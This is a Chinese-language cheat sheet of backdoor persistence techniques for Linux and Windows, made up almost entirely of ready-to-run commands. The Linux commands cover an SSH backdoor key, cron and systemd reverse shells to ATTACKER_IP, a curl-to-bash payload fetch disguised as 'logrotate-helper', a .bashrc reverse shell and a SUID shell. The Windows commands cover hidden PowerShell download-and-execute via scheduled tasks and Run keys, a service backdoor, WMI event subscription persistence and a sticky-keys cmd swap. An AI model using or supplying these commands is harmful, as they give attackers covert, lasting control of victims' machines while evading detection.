# Linux 持久化技术详解

## SSH 公钥（最可靠）
```bash
ssh-keygen -t rsa -N '' -f backdoor_key
echo 'ssh-rsa AAAA...' >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
ssh -i backdoor_key root@target
```

## Cron 任务
```bash
# 每分钟反弹 shell
echo '* * * * * /bin/bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"' | crontab -

# 更隐蔽：写入系统 cron 目录
echo '*/5 * * * * root curl http://ATTACKER_IP/payload.sh | bash' > /etc/cron.d/logrotate-helper
```

## bashrc/profile 后门
```bash
echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &' >> /root/.bashrc
```

## SUID 后门
```bash
cp /bin/bash /tmp/.hidden_shell
chmod u+s /tmp/.hidden_shell
# 以后用 /tmp/.hidden_shell -p 获取 root
```

## systemd 服务
```bash
cat > /etc/systemd/system/update-helper.service << 'EOF'
[Unit]
Description=System Update Helper
[Service]
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
Restart=always
RestartSec=60
[Install]
WantedBy=multi-user.target
EOF
systemctl enable update-helper
systemctl start update-helper
```

---

# Windows 持久化技术详解

## 计划任务
```cmd
schtasks /create /tn "WindowsUpdate" /tr "powershell -ep bypass -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/payload.ps1')\"" /sc minute /mo 5 /ru SYSTEM
```

## 注册表启动项
```cmd
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "powershell -ep bypass -w hidden -enc BASE64_PAYLOAD" /f
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "SystemHelper" /t REG_SZ /d "C:\Windows\Temp\payload.exe" /f
```

## 服务后门
```cmd
sc create "WindowsUpdateHelper" binpath= "cmd.exe /c powershell -ep bypass -w hidden -c ..." start= auto
```

## WMI 事件订阅（高级，难以检测）
```powershell
$Filter = Set-WmiInstance -Class __EventFilter -Arguments @{
    Name = 'SystemCheck'; EventNameSpace = 'root\cimv2'; QueryLanguage = 'WQL';
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}
$Consumer = Set-WmiInstance -Class CommandLineEventConsumer -Arguments @{
    Name = 'SystemCheckConsumer'; CommandLineTemplate = 'powershell -ep bypass -w hidden -enc BASE64'
}
Set-WmiInstance -Class __FilterToConsumerBinding -Arguments @{Filter = $Filter; Consumer = $Consumer}
```

## Sticky Keys 后门（物理/RDP 访问）
```cmd
copy C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
# 在登录界面连按 5 次 Shift → 弹出 SYSTEM 权限的 cmd
```
